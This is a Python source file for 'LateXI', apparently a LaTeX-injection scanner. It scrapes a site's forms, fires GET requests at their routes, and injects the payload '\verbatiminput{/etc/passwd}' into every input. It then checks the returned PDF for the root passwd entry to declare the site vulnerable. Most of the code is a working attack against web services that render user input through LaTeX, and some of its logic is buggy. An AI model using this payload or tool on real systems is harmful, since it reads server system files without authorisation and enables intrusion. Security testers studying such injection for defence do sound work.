import argparse
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore
import random
import string
from io import BytesIO
from PyPDF2 import PdfReader
import urllib.parse
from art import *
import os

init(autoreset=True)

def print_banner():
    tprint("LateXI", font="isometric1")
    print("By M58 and PauvreTimo")

def get_routes_and_forms(url, perform_get_request, search):
    try:
        
        response = requests.get(url)

        if response.status_code == 200:
            
            soup = BeautifulSoup(response.text, 'html.parser')

            if search:
                print("Found forms and inputs:")
                forms = soup.find_all('form')
                for idx, form in enumerate(forms, start=1):
                    print(f"Form {idx}:")
                    print(f"  Action: {form.get('action', '/')}")
                    inputs = form.find_all('input')
                    for input_tag in inputs:
                        input_type = input_tag.get('type')
                        input_name = input_tag.get('name')
                        print(f"  Input type: {input_type}, name: {input_name}")
                return

            
            forms = soup.find_all('form')
            all_routes = []

            for form in forms:
                
                action = form.get('action', '/')
                all_routes.append(action)

                
                inputs = form.find_all('input')

            
            if perform_get_request:
                print("Routes found:")
                for idx, route in enumerate(all_routes, start=1):
                    print(f"{idx}. {route}")

                selected_numbers = input("Enter the number(s) of the route(s) to check (comma-separated): ").split(',')
                selected_numbers = [int(num.strip()) for num in selected_numbers]

                for num in selected_numbers:
                    if 1 <= num <= len(all_routes):
                        route = all_routes[num - 1]
                        get_response = requests.get(url + route)
                        
                        
                        get_status = get_response.status_code
                        
                        if get_status != 200:
                            print(f"{Fore.RED}GET Request failed for {route}")
                            include_input = input("Would you like to include found input in the request? (Y/n) ")
                            if include_input.lower() == 'y' or include_input.lower() == '':
                                
                                for i in range(len(inputs)):
                                    
                                    if inputs[i].get('name') == None:
                                        del inputs[i]
                                        break
                                    print(f"{i+1}. {inputs[i].get('name')}")
                                    random_string = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

                                    payload = "&".join([f"{input_tag.get('name')}={random_string}" for i, input_tag in enumerate(inputs)])
                                print(f"Payload with all inputs: {payload}")
                                new_request = input("[?] Would you like to perform a new GET request with the payload? (Y/n) ")
                                if new_request.lower() == 'y' or new_request.lower() == "":
                                    get_response = requests.get(url + route, params=payload)
                                    print(f"/I\ New GET request: {url + route}?{payload}")
                                    if get_response.status_code == 200:
                                        print(f"{Fore.GREEN}=> GET Request succeeded for {route}")
                                        
                                        
                                        is_pdf = get_response.content.startswith(b'%PDF')
                                        if is_pdf:
                                            pdf_file = True
                                            print(f"{Fore.GREEN}/I\ Output appears to be a PDF file")
                                            with open("downloaded.pdf", "wb") as pdf_file:
                                                pdf_file.write(get_response.content)

                                                reader = PdfReader("downloaded.pdf")
                                                page = reader.pages[0]
                                                text = page.extract_text()
                                                if random_string in text:
                                                    print(f"{Fore.GREEN}[!] PDF is well-formed")
                                                else :
                                                    print(f"{Fore.RED}[!] PDF is malformed")
                                        else :
                                            pdf_file = False
                                            if random_string in get_response.content.decode('utf-8'):
                                                print(f"{Fore.GREEN}[!] GET Request succeeded for {route}")
                                            else :
                                                print(f"{Fore.RED}[!] GET Request failed for {route}")

                                        
                                        if args.injections:
                                            choice_inject = input("Are you sure you want to perform injections? (Y/n) ")
                                            if choice_inject.lower() == 'y' or choice_inject.lower() == "":
                                                first_test = "\\verbatiminput{/etc/passwd}"
                                                payload = "&".join([f"{urllib.parse.quote(input_tag.get('name'))}={first_test}" for i, input_tag in enumerate(inputs)])
                                                print(payload)
                                                get_response = requests.get(url + route, params=payload, stream=True)
                                                print(f"/I\ New GET request: {url + route}?{payload}")
                                                if get_response.status_code == 200:
                                                    print(f"{Fore.GREEN}=> GET Request succeeded for {route}")
                                                    if pdf_file :
                                                        with open("downloaded.pdf", "wb") as pdf_file:
                                                            pdf_file.write(get_response.content)

                                                            reader = PdfReader("downloaded.pdf")
                                                            page = reader.pages[0]
                                                            text = page.extract_text()
                                                            if 'root:x:0:0:root:/root:/bin/bash' in text:
                                                                print(f"{Fore.GREEN}[!] Website is vulnerable to LateX attacks")
                                                            else :
                                                                print(f"{Fore.RED}[!] Website is not vulnerable to LateX attacks")

        else:
            print(Fore.RED + f"Failed to retrieve the webpage. Status code: {response.status_code}")
    except Exception as e:
        print(Fore.RED + f"An error occurred: {str(e)}")

if __name__ == '__main__':
    os.system('cls' if os.name == 'nt' else 'clear')
    parser = argparse.ArgumentParser(description="Extract routes and form details from a webpage")
    parser.add_argument("url", help="URL of the webpage to analyze")
    parser.add_argument("--banner", help="Print banner", action="store_true")
    parser.add_argument("--get-requests", action="store_true", help="Perform GET requests to found routes")
    parser.add_argument("--search", action="store_true", help="Search for all forms and inputs on the page")
    parser.add_argument("--injections", action="store_true", help="Search for all forms and inputs on the page")
    args = parser.parse_args()

    get_routes_and_forms(args.url, args.get_requests, args.search)
    if args.banner:
        print_banner()
